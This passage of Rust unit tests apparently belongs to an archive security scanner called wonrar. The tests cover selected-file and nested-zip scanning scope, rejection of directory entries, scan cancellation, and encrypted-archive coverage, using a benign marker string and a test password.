        assert_eq!(clean.coverage.scanned_files, 1);
        assert!(clean.rule_findings.is_empty());
        assert!(clean.structural_findings.is_empty());
        assert!(clean.message.starts_with("Selected files only:"));
        let marker = scan_selected(
            &path,
            None,
            std::slice::from_ref(&marker_id),
            &info.identity,
            &cancel,
            &|_| {},
        )
        .unwrap();
        assert_eq!(marker.coverage.total_files, 1);
        assert!(marker.rule_findings.iter().any(|f| f.path == "marker.txt"));
        assert!(scan_selected(&path, None, &[], &info.identity, &cancel, &|_| {}).is_err());
        assert!(scan_selected(
            &path,
            None,
            &["unknown".into()],
            &info.identity,
            &cancel,
            &|_| {}
        )
        .is_err());
        assert!(
            scan_selected(&path, None, &[marker_id], "stale", &cancel, &|_| {})
                .unwrap_err()
                .contains("changed since review")
        );
        let whole = scan(&path, None, &cancel, &|_| {}).unwrap();
        assert_eq!(whole.scope.kind, "archive");
        assert_eq!(whole.scope.selected_files, 2);
        assert_eq!(whole.coverage.total_files, 2);
    }
    #[test]
    fn selected_nested_container_keeps_nested_scope_and_depth_coverage() {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("outer.zip");
        let nested = fixture(&[("inside.txt", b"WONRAR-BENIGN-SCAN-TEST-2026")]);
        std::fs::write(
            &path,
            fixture(&[("nested.zip", &nested), ("unrelated.txt", b"unrelated")]),
        )
        .unwrap();
        let info = wonrar_core::inspect(&path).unwrap();
        let id = info
            .entries
            .iter()
            .find(|e| e.name == "nested.zip")
            .unwrap()
            .id
            .clone();
        let report = scan_selected(
            &path,
            None,
            &[id],
            &info.identity,
            &AtomicBool::new(false),
            &|_| {},
        )
        .unwrap();
        assert_eq!(report.scope.selected_files, 1);
        assert_eq!(report.coverage.total_files, 2);
        assert_eq!(report.coverage.nested_archives, 1);
        assert!(report.coverage.complete);
        assert!(report
            .rule_findings
            .iter()
            .any(|f| f.path == "nested.zip!inside.txt"));
        assert!(!report
            .rule_findings
            .iter()
            .any(|f| f.path == "unrelated.txt"));
    }
    #[test]
    fn selected_directories_are_rejected() {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("directory.zip");
        let mut zip = zip::ZipWriter::new(std::fs::File::create(&path).unwrap());
        zip.add_directory("folder/", zip::write::SimpleFileOptions::default())
            .unwrap();
        zip.finish().unwrap();
        let info = wonrar_core::inspect(&path).unwrap();
        assert!(scan_selected(
            &path,
            None,
            &[info.entries[0].id.clone()],
            &info.identity,
            &AtomicBool::new(false),
            &|_| {}
        )
        .unwrap_err()
        .contains("file entries only"));
    }
    #[test]
    fn cancelled_scan_has_no_completed_verdict() {
        assert!(scan(
            Path::new("not-opened.zip"),
            None,
            &AtomicBool::new(true),
            &|_| {}
        )
        .unwrap_err()
        .contains("cancelled"));
    }
    #[test]
    fn encrypted_coverage_requires_password_and_accepts_correct_secret() {
        let dir = tempfile::tempdir().unwrap();
        let input = dir.path().join("private.txt");
        std::fs::write(&input, b"ordinary private contents").unwrap();
        let output = dir.path().join("private.zip");
        wonrar_core::create_with_password(
            &output,
            &[input],
            &AtomicBool::new(false),
            &|_| {},
            Some("fixture-secret"),
        )
        .unwrap();
        let missing = scan(&output, None, &AtomicBool::new(false), &|_| {}).unwrap();
        assert!(!missing.coverage.complete);
        assert_eq!(missing.coverage.scanned_files, 0);
        let correct = scan(
            &output,
            Some("fixture-secret"),
            &AtomicBool::new(false),
            &|_| {},
        )
        .unwrap();
        assert!(correct.coverage.complete);
        assert_eq!(correct.status, "no_findings");
    }
}
